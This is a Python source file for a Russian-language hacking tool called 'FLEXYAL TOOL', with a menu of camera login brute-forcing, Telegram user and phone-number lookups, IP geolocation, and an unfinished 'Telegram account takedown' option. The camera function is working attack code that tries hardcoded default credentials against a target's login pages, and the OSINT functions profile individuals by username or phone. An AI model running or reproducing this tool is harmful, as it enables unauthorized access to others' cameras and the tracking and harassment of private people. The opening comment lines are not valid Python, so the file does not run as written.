-- open a README.md file before start.
-- Created by Alpha Team.
--

import os
import time
import requests
from bs4 import BeautifulSoup
from colorama import Fore, init, Style

# Инициализация colorama для цветного вывода
init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    print(Fore.CYAN + r"""
  ______ _      __  __          ___   _   _ _______ 
 |  ____| |    |  \/  |   /\   / _ \ | \ | |__   __|
 | |__  | |    | \  / |  /  \ | | | ||  \| |  | |   
 |  __| | |    | |\/| | / /\ \| | | || . ` |  | |   
 | |____| |____| |  | |/ ____ \ |_| || |\  |  | |   
 |______|______|_|  |_/_/    \_\___/ |_| \_|  |_|   
""" + Fore.RESET)
    print(Fore.BLUE + "=" * 60)
    print(" FLEXYAL TOOL - OSINT инструмент для кибербезопасности")
    print("=" * 60 + Fore.RESET)
    print("\n")

def camera_bruteforce():
    clear_screen()
    print(Fore.YELLOW + "\n[+] Брутфорс камер (базовая проверка уязвимостей)" + Fore.RESET)
    
    target = input("Введите URL/IP камеры: ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    common_credentials = [
        ('admin', 'admin'),
        ('admin', '12345'),
        ('admin', 'password'),
        ('root', 'root'),
        ('user', 'user'),
        ('supervisor', 'supervisor'),
        ('guest', 'guest'),
        ('admin', '1234'),
        ('admin', '123456'),
        ('admin', '111111')
    ]
    
    print(Fore.CYAN + f"\n[+] Проверяем {target} на стандартные учетные данные..." + Fore.RESET)
    
    # Проверяем доступность хоста перед брутфорсом
    try:
        print(Fore.CYAN + "[*] Проверяем доступность хоста..." + Fore.RESET)
        response = requests.get(target, timeout=10)
        if response.status_code == 200:
            print(Fore.GREEN + "[+] Хост доступен, продолжаем проверку..." + Fore.RESET)
        else:
            print(Fore.YELLOW + f"[!] Хост ответил с кодом {response.status_code}" + Fore.RESET)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Ошибка подключения к {target}: {str(e)}" + Fore.RESET)
        print(Fore.YELLOW + "[!] Проверьте следующие моменты:" + Fore.RESET)
        print("- IP-адрес действительно принадлежит камере")
        print("- Камера включена и доступна из вашей сети")
        print("- Нет блокировки брандмауэром")
        print("- Попробуйте другой порт (например, :8080)")
        input("\nНажмите Enter для продолжения...")
        return
    
    # Список возможных путей к странице входа
    login_paths = [
        '/cgi-bin/login.cgi',
        '/login.cgi',
        '/cgi/login.cgi',
        '/login.html',
        '/admin/login.html',
        '/cgi-bin/authLogin.cgi',
        '/login.php',
        '/admin/login.php',
        '/view/login.shtml'
    ]
    
    found = False
    
    for path in login_paths:
        login_url = target + path
        print(Fore.CYAN + f"\n[+] Проверяем путь: {login_url}" + Fore.RESET)
        
        try:
            # Проверяем существует ли страница входа
            response = requests.get(login_url, timeout=10)
            if response.status_code != 200:
                continue
                
            print(Fore.GREEN + f"[+] Найдена страница входа: {login_url}" + Fore.RESET)
            
            for username, password in common_credentials:
                try:
                    session = requests.Session()
                    
                    # Пробуем разные варианты данных для входа
                    data = {
                        'username': username,
                        'password': password,
                        'Login': 'Login'
                    }
                    
                    headers = {
                        'User-Agent': 'Mozilla/5.0',
                        'Referer': login_url
                    }
                    
                    response = session.post(login_url, data=data, headers=headers, timeout=10)
                    
                    # Проверяем признаки успешного входа
                    if "success" in response.text.lower() or "welcome" in response.text.lower() or "main.htm" in response.text:
                        print(Fore.GREEN + f"\n[+] УСПЕШНЫЙ ВХОД! Логин: {username} Пароль: {password}" + Fore.RESET)
                        print(Fore.GREEN + f"[+] Страница входа: {login_url}" + Fore.RESET)
                        found = True
                        break
                    elif "incorrect" in response.text.lower() or "invalid" in response.text.lower():
                        print(Fore.RED + f"[-] Неверно: {username}:{password}" + Fore.RESET)
                    else:
                        print(Fore.YELLOW + f"[?] Неизвестный ответ для: {username}:{password}" + Fore.RESET)
                        
                except Exception as e:
                    print(Fore.RED + f"[-] Ошибка при проверке {username}:{password} - {str(e)}" + Fore.RESET)
                    continue
            
            if found:
                break
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при проверке {login_url} - {str(e)}" + Fore.RESET)
            continue
    
    if not found:
        print(Fore.YELLOW + "\n[!] Не удалось найти рабочую страницу входа или подобрать учетные данные" + Fore.RESET)
        print(Fore.YELLOW + "[!] Возможные причины:" + Fore.RESET)
        print("- Камера использует нестандартные пути входа")
        print("- Учетные данные были изменены на нестандартные")
        print("- Требуется аутентификация другого типа (например, Basic Auth)")
    
    input("\nНажмите Enter для продолжения...")

def telegram_osint():
    clear_screen()
    print(Fore.YELLOW + "\n[+] Telegram OSINT инструменты" + Fore.RESET)
    
    print("\n1. Поиск информации о пользователе")
    print("2. Проверка номера телефона")
    print("3. Поиск в публичных каналах")
    print("0. Назад")
    
    choice = input("\nВыберите опцию: ")
    
    if choice == "1":
        username = input("Введите username пользователя (@username): ").strip('@')
        print(Fore.CYAN + f"\n[+] Ищем информацию о @{username}..." + Fore.RESET)
        
        try:
            # Поиск через telegago
            url = f"https://telegago.com/search?q=@{username}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            results = soup.find_all('div', class_='result-item')
            if results:
                print(Fore.GREEN + f"[+] Найдены публичные сообщения от @{username}:" + Fore.RESET)
                for item in results[:3]:
                    print(f"- {item.text[:100]}...")
                    print(f"  Ссылка: {item.find('a')['href']}\n")
            else:
                print(Fore.RED + f"[-] Публичных сообщений от @{username} не найдено" + Fore.RESET)
                
            # Дополнительная проверка через t.me
            print(Fore.CYAN + "\n[+] Проверка через t.me..." + Fore.RESET)
            tme_url = f"https://t.me/{username}"
            tme_response = requests.get(tme_url, timeout=10)
            
            if "tgme_page_description" in tme_response.text:
                soup = BeautifulSoup(tme_response.text, 'html.parser')
                description = soup.find('div', class_='tgme_page_description')
                if description:
                    print(Fore.GREEN + f"[+] Описание профиля: {description.text[:200]}..." + Fore.RESET)
                
                photo = soup.find('img', class_='tgme_page_photo_image')
                if photo:
                    print(Fore.GREEN + f"[+] Фото профиля: {photo['src']}" + Fore.RESET)
                    
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при поиске: {str(e)}" + Fore.RESET)
            
    elif choice == "2":
        phone = input("Введите номер телефона (с кодом страны): ").strip()
        print(Fore.CYAN + f"\n[+] Проверяем номер {phone}..." + Fore.RESET)
        
        try:
            # Проверка через API (пример)
            print(Fore.YELLOW + "[!] Эта функция требует API ключ Telegram" + Fore.RESET)
            
            # Альтернативная проверка через поиск в Google
            print(Fore.CYAN + "\n[+] Поиск в Google..." + Fore.RESET)
            google_url = f"https://www.google.com/search?q={phone}+site:t.me"
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.get(google_url, headers=headers, timeout=10)
            
            if "t.me" in response.text:
                print(Fore.GREEN + "[+] Найдены упоминания номера в Telegram:" + Fore.RESET)
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    if 't.me' in link['href']:
                        print(f"- {link['href']}")
            else:
                print(Fore.RED + "[-] Упоминаний номера в Telegram не найдено" + Fore.RESET)
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при проверке: {str(e)}" + Fore.RESET)
            
    elif choice == "3":
        query = input("Введите поисковый запрос: ").strip()
        print(Fore.CYAN + f"\n[+] Ищем '{query}' в публичных каналах..." + Fore.RESET)
        
        try:
            # Поиск через tgstat
            url = f"https://tgstat.com/search?q={query}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            channels = soup.select('.channel-item')
            if channels:
                print(Fore.GREEN + f"[+] Найдены каналы по запросу '{query}':" + Fore.RESET)
                for channel in channels[:3]:
                    name = channel.select_one('.channel-name').text
                    members = channel.select_one('.channel-members').text
                    print(f"- {name} ({members})")
                    desc = channel.select_one('.channel-description')
                    if desc:
                        print(f"  Описание: {desc.text[:80]}...")
                    print()
            else:
                print(Fore.RED + f"[-] Каналы по запросу '{query}' не найдены" + Fore.RESET)
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при поиске: {str(e)}" + Fore.RESET)
            
    input("\nНажмите Enter для продолжения...")

def ip_osint():
    clear_screen()
    print(Fore.YELLOW + "\n[+] IP-OSINT инструменты" + Fore.RESET)
    
    ip = input("Введите IP-адрес для проверки: ").strip()
    
    print(Fore.CYAN + f"\n[+] Собираем информацию об {ip}..." + Fore.RESET)
    
    try:
        # Проверка через ipinfo.io
        print(Fore.CYAN + "[+] Основная информация..." + Fore.RESET)
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = response.json()
        
        print(Fore.GREEN + "[+] Основная информация:" + Fore.RESET)
        print(f"IP: {data.get('ip', 'N/A')}")
        print(f"Хост: {data.get('hostname', 'N/A')}")
        print(f"Город: {data.get('city', 'N/A')}")
        print(f"Регион: {data.get('region', 'N/A')}")
        print(f"Страна: {data.get('country', 'N/A')}")
        print(f"Провайдер: {data.get('org', 'N/A')}")
        print(f"Почтовый индекс: {data.get('postal', 'N/A')}")
        print(f"Часовой пояс: {data.get('timezone', 'N/A')}")
        
        # Проверка на VPN/TOR
        print(Fore.CYAN + "\n[+] Проверка на VPN/Proxy/TOR..." + Fore.RESET)
        if "VPN" in data.get('org', '') or "Proxy" in data.get('org', ''):
            print(Fore.RED + "- Возможно VPN/Proxy" + Fore.RESET)
        else:
            print(Fore.GREEN + "- Не обнаружено VPN/Proxy" + Fore.RESET)
            
        # Проверка через ip-api.com
        print(Fore.CYAN + "\n[+] Дополнительная информация..." + Fore.RESET)
        ipapi_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        ipapi_data = ipapi_response.json()
        
        if ipapi_data.get('status') == 'success':
            print(f"ISP: {ipapi_data.get('isp', 'N/A')}")
            print(f"AS: {ipapi_data.get('as', 'N/A')}")
            print(f"Координаты: {ipapi_data.get('lat', 'N/A')}, {ipapi_data.get('lon', 'N/A')}")
        
        # Проверка чёрных списков
        print(Fore.CYAN + "\n[+] Проверка чёрных списков..." + Fore.RESET)
        try:
            abuseipdb_url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}"
            headers = {"Key": "YOUR_API_KEY", "Accept": "application/json"}
            response = requests.get(abuseipdb_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                abuse_data = response.json().get('data', {})
                if abuse_data.get('abuseConfidenceScore', 0) > 0:
                    print(Fore.RED + f"- IP найден в AbuseIPDB (score: {abuse_data['abuseConfidenceScore']})" + Fore.RESET)
                    print(f"  Последнее сообщение: {abuse_data.get('lastReportedAt', 'N/A')}")
                else:
                    print(Fore.GREEN + "- IP не найден в AbuseIPDB" + Fore.RESET)
            else:
                print(Fore.YELLOW + "- Не удалось проверить AbuseIPDB (требуется API ключ)" + Fore.RESET)
        except:
            print(Fore.YELLOW + "- Ошибка проверки AbuseIPDB" + Fore.RESET)
            
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка при получении информации: {str(e)}" + Fore.RESET)
    
    input("\nНажмите Enter для продолжения...")

def telegram_account_removal():
    clear_screen()
    print(Fore.RED + "\n[!] Внимание: Эта функция не завершена и может не работать!" + Fore.RESET)
    print(Fore.YELLOW + "[!] Функция сноса аккаунта в Telegram в разработке..." + Fore.RESET)
    time.sleep(2)

def main_menu():
    while True:
        clear_screen()
        display_banner()
        
        print(Fore.GREEN + "Главное меню:" + Fore.RESET)
        print("1. Брутфорс камер")
        print("2. Telegram OSINT")
        print("3. IP-OSINT")
        print("4. Снос аккаунта в TG (не доделан)")
        print("0. Выход")
        
        choice = input("\nВыберите опцию: ")
        
        if choice == "1":
            camera_bruteforce()
        elif choice == "2":
            telegram_osint()
        elif choice == "3":
            ip_osint()
        elif choice == "4":
            telegram_account_removal()
        elif choice == "0":
            print(Fore.CYAN + "\n[+] Выход из программы..." + Fore.RESET)
            break
        else:
            print(Fore.RED + "\n[!] Неверный выбор, попробуйте снова." + Fore.RESET)
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Программа прервана пользователем." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"\n[!] Произошла ошибка: {str(e)}" + Fore.RESET)
